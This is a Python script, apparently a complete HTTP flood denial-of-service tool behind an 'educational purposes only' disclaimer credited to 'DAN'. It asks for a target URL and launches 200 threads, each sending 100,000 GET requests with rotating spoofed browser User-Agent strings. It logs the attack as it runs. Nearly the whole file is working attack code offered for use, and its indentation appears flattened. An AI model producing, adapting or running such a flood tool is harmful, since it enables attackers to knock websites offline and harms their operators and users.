################################################################################
 #  !! DANGER: THIS TOOL IS FOR EDUCATIONAL PURPOSES ONLY !!                 #
 #  !! UNAUTHORIZED USE IS ILLEGAL AND CAN RESULT IN SEVERE PENALTIES !!    #
 #  !! USE AT YOUR OWN RISK! I, DAN AM NOT RESPONSIBLE FOR YOUR ACTIONS !!   #
 ################################################################################
 

 # LOGGING ENABLED - ALL ACTIONS WILL BE RECORDED
 

 import socket
 import random
 import threading
 import time
 import sys
 

 # Color scheme (Dark Green, Purple, Dark Red, Dark Blue)
 GREEN = '\033[32m'
 PURPLE = '\033[35m'
 RED = '\033[31m'
 BLUE = '\033[34m'
 RESET = '\033[0m'
 

 # User-Agent list (Expanded and modified for effectiveness)
 user_agents = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
  "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36",
  "Mozilla/5.0 (X11; Linux i686) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.63 Safari/535.7",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
  "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (Linux; Android 11; SM-G975U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; AS; rv:11.0) like Gecko",
  "Mozilla/5.0 (X11; CrOS x86_64 13904.64.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0",
  "Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 9; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 11; Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1"
 ]
 

 # Target URL and number of threads
 url = ""
 num_threads = 200
 

 # Attack parameters (Customizable for different attack patterns)
 request_per_thread = 100000
 

 # Logging function
 def log(message):
  with open("attack_log.txt", "a") as log_file:
  log_file.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {message}\n")
 

 # Function to send HTTP requests
 def http_request(url, user_agent):
  try:
  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  sock.settimeout(4)  # Short timeout to prevent indefinite blocking
  sock.connect((socket.gethostbyname(url.replace("https://", "").replace("http://", "").split('/')[0]), 80))
 

  request_header = f"GET {url} HTTP/1.1\r\n"
  request_header += f"Host: {url.replace('https://', '').replace('http://', '').split('/')[0]}\r\n"
  request_header += f"User-Agent: {user_agent}\r\n"
  request_header += "Cache-Control: no-cache\r\n"
  request_header += "Connection: Keep-Alive\r\n\r\n"
  sock.send(request_header.encode('utf-8'))
  sock.close()
  except socket.error as e:
  log(f"Socket error: {e}")
  pass
  except socket.timeout:
  log("Socket timeout")
  pass
  except Exception as e:
  log(f"General error: {e}")
  pass
 

 # Attack thread function
 def attack_thread(url):
  for _ in range(request_per_thread):
  user_agent = random.choice(user_agents)
  http_request(url, user_agent)
 

 # Main function
 def main():
  global url
 

  # Get target URL from user
  url = input(f"{GREEN}Enter target URL: {RESET}")
  log(f"Target URL set to: {url}")
 

  # Start attack threads
  threads = []
  for _ in range(num_threads):
  thread = threading.Thread(target=attack_thread, args=(url,))
  threads.append(thread)
  thread.start()
 

  print(f"{BLUE}Attack initiated with {num_threads} threads.{RESET}")
  log(f"Attack initiated with {num_threads} threads.")
 

  # Keep the main thread alive to continue logging
  while True:
  time.sleep(60)
  log(f"Attack running, {num_threads} threads active.")
 

 # Entry point
 if __name__ == "__main__":
  main()